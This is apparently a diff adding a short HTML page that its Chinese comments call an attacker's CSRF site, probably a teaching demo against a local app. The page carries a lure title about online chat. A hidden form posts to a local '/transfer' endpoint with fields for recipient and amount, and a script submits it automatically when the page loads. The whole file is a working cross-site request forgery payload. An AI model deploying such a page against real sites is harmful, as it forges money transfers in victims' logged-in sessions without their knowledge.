@@ -1,0 +1,25 @@
+<!-- 
+  这是攻击者的 CSRF 站点
+ -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<body>
+  <!-- 冒充你请求你的网站接口 -->
+  <h1>在线美女聊天...</h1>
+  <form action="http://localhost:3000/transfer" method="POST">
+    <input type="text" hidden name="转给谁">
+    <input type="text" hidden name="多少钱">
+    <input type="text" hidden name="xxx">
+  </form>
+  <script>
+    // 手动提交表单
+    document.forms[0].submit()
+  </script>
+</body>
+</html>
